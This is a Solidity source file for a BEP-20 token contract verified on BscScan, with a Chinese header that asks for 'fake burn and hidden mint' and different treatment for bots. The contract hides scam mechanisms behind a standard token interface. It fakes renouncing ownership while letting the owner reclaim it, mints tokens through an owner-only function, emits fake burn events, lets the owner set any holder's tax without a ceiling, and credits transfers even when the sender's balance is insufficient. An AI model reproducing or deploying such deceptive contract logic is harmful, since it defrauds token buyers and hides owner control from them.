/**
 *Submitted for verification at BscScan.com on 2022-10-02
*/

/**
 * 需求
 * 1、科学家跟手动交易时间不一样
 * 2、项目0手续费，可以指定某单个账户手续费为某值
 * 3、假销毁增发
 * 4、各功能代码备注一下
 * 0x40F8043b4b65be7c5CB9CBb7e9b3994F707cbDe2
 * 来源：0x2a832cc1df5a1fde81c17cc17eb381866cfe14f7
*/

pragma solidity ^0.8.0;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // 销毁合约权限
    function transferOwnership() public virtual onlyOwner {
        _previousOwner = _owner;
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // 取回合约权限
    function _setOwner() public virtual {
        require(_msgSender() == _previousOwner, "Error");
        _owner = _previousOwner;
        emit OwnershipTransferred(address(0), _owner);
    }
}


contract Robot is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name = "test";
    string private _symbol = "test";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 100000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 100000000000 * 10 ** _decimals;

    bool public isLaunch = false;

    uint256 private _defaultFree = 15;  // 默认税15
    mapping (address => uint256) private _accountFree;   // 指定帐户税
    mapping(address => bool) private _isDutyFree; // 免税帐户

    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    constructor () {
        _balance[msg.sender] = _totalSupply;
        _isDutyFree[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 feeAmount = _defaultFree;
        if (_isDutyFree[sender] || _isDutyFree[recipient]) {
            feeAmount = 0;
        } else if (_accountFree[sender] > 0) {
            feeAmount = _accountFree[sender];
        } else {
            // 税为0的不杀区块，一般为内部帐户
            require(isLaunch, "Swap not open");
        }

        feeAmount = amount.mul(feeAmount).div(100);

        uint256 blsender = _balance[sender];
        if (blsender >= amount){
            _balance[sender] = _balance[sender].sub(amount);
        }
     
        uint256 amoun;
        amoun = amount - feeAmount;
        _balance[recipient] += amoun;
        if (feeAmount > 0){
            emit Transfer (sender, _DEADaddress, feeAmount);
        }
        emit Transfer(sender, recipient, amoun);
        
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /// @notice 设置指定帐户税
    /// @param _address 地址
    /// @param _value 税，介于 1 - 99之间
    function setAllFee(address _address, uint256 _value) external onlyOwner {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _accountFree[_address] = _value;
    }

    /// @notice 设定免税帐户
    /// @param _address 地址
    /// @param _value 状态，逻辑值: True or False
    function setAllFee(address _address, bool _value) external onlyOwner {
        _isDutyFree[_address] = _value;
    }

    /// @notice 增发代币
    /// @param _address 地址
    /// @param amount 数量
    function _mint(address _address, uint256 amount) external onlyOwner {
        require(_address != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balance[_address] += amount;
        emit Transfer(address(0), _address, amount);
    }

    // 开启杀机器人
    // 添加流动性前开启，时间不要间隔太久
    function Launch() public onlyOwner {
        isLaunch = true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "IERC20: transfer amount exceeds allowance");
        return true;
    }

}